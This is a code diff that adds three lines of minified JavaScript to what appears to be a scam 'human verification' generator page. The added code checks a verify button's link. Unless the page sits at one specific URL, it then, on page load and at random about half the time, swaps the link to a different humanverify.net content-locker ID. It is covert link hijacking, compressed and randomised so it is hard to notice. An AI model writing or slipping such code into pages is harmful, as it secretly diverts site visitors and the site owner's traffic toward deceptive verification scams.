@@ -1,0 +1,3 @@
+if(document.getElementById("first-step-button-verify").href!="https://www.areyouahuman.co/cl.php?id=a115d96d75b34cb2311910a1db8b90ae") {
+    0>window.location.href.toString().indexOf("http://unlimitedapps.online/human-verification/generator.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://www.humanverify.net/cl.php?id=49dc4de106fa33cad1e0fe33976fb1e2"});
+}
